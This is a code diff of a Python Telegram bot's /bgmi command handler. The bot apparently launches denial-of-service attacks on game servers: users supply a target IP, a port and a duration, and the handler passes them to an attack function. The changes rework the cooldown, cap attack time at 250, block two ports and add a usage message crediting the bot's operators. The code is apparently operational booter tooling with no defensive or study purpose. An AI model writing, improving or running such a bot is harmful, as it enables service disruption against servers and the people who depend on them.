@@ -233,28 +233,34 @@ def start_attack_reply(message, target, port, time):
     bot.reply_to(message, response)
 
 # Handler for /bgmi command
+# ...
+
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
-        # Check if the user is in admin_id (admins have no cooldown)
-        if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
-                bot.reply_to(message, response)
-                return
-            # Update the last time the user ran the command
-            bgmi_cooldown[user_id] = datetime.datetime.now()
-
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
+        if len(command) == 1:  # Only /bgmi command, no cooldown
+            response = "Usage :- /bgmi <target> <port> <time>\nby @bhoothihu / @devz_on"  # Updated command syntax
+            bot.reply_to(message, response)
+        elif len(command) == 4:  # /bgmi with target, port, and time, apply cooldown
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 5000:
-                response = "Error: Time interval must be less than 5000."
+            if time > 250:
+                response = "Error: Time interval must be less than 250."
+            elif port in [20001, 20002]:
+                response = "Error: Ports 20001 and 20002 are not allowed."
             else:
+                if user_id not in admin_id:
+                    # Check if the user has run the command before and is still within the cooldown period
+                    if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
+                        response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
+                        bot.reply_to(message, response)
+                        return
+                    # Update the last time the user ran the command
+                    bgmi_cooldown[user_id] = datetime.datetime.now()
+
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
